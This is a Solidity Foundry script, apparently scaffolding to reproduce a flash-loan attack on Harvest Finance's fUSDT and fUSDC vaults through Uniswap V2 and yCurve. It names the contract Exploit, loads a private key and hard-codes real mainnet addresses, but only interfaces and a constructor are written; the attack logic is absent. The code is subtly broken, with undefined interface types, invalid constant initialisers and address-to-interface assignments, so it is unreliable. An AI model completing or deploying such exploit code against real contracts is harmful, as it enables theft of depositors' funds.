// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Script.sol";

interface ERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function withdraw(uint256) external;
    function name() external view returns (string memory);
}

interface HVault {
    function deposit(uint256) external;
    function balanceOf(address) external returns (uint256);
    function withdraw(uint256) external;
}

interface YCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface CurveStrategy {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

contract Rw2_ is Script {
    uint256 constant secret = vm.envUint("PRIVATE_KEY");
    address constant attacker = vm.rememberKey(secret);
    address constant usdt = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address constant usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Exploit constant exploit = new Exploit(usdt);


    function run() external {
        vm.startBroadcast(secret);
        vm.stopBroadcast();
    }
}

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router {
    function WETH() external view returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external view returns (address);

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountIn);

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);

    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function swapETHForExactTokens(uint256 amountOut, address[] memory path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    function swapExactETHForTokens(uint256 amountOutMin, address[] memory path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract Exploit is IUniswapV2Callee {
    using Address for address;


// ======== CONSTANTS ========

    address immutable owner;

    IUniswapV2Router constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    ERC20 constant usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ERC20 constant usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20 constant wrappedETH = ERC20(router.WETH());

    ERC20 immutable mainToken;
    ERC20 immutable subToken;
    IUniswapV2Pair immutable mainPair; // WETH-MainToken
    IUniswapV2Pair immutable subPair; // WETH-SubToken

    IHarvestVault immutable harvest;
    address constant harvestUsdtVault = address(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C); // HVault: fUSDT
    address constant harvestUsdcVault = address(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE); // HVault: fUSDC

    IcurveYSwap constant curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51); // yCurve

    // ERC20 fusdt = ERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // ERC20 fusdc = ERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // ======== INITIALIZATION ========

    /// @dev choose main token and sub token
    /// currently only supports between USDT and USDC
    constructor(address _mainToken) {
        owner = msg.sender;
        {
            // set main token and sub token
            // make sure to earn some as a type of main token
            if (_mainToken == address(usdt)) {
                mainToken = usdt;
                subToken = usdc;
                harvest = IHarvestVault(harvestUsdtVault);
            } else if (_mainToken == address(usdc)) {
                mainToken = usdc;
                subToken = usdt;
                harvest = IHarvestVault(harvestUsdcVault);
            } else {
                revert("Invalid token");
            }
        }
        {
            // pairs for flashloan
            mainPair = factory.getPair(wrappedETH, mainToken);
            subPair = factory.getPair(wrappedETH, subToken);
            require(mainPair != address(0) && subPair != address(0), "Pair not found");
        }
    }


}
